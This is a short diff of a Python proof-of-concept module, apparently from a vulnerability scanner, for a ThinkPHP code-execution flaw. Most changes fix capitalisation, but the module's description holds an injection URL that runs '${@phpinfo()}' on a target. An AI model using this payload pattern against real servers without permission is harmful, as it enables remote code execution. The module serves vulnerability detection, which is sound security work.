@@ -4,13 +4,13 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'ThinkPhp_0101' # 平台漏洞编号
-    name = 'ThinkPhp框架代码执行' # 漏洞名称
+    vuln_id = 'ThinkPHP_0101' # 平台漏洞编号
+    name = 'ThinkPHP框架代码执行' # 漏洞名称
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
     disclosure_date = ''  # 漏洞公布时间
-    desc = '''模版漏洞描述
-    ThinkPhp框架代码执行
+    desc = '''
+    ThinkPHP框架代码执行
     url = self.target + "/index.php/module/aciton/param1/${@phpinfo()}"
     try:
         r = requests.get(url, timeout=5)
@@ -24,7 +24,7 @@ class Vuln(ABVuln):
     ref = 'https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/thinkphp/thinkphpCodeEXE.py' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'ThinkPhp'  # 漏洞组件名称
+    product = 'ThinkPHP'  # 漏洞组件名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 class Poc(ABPoc):
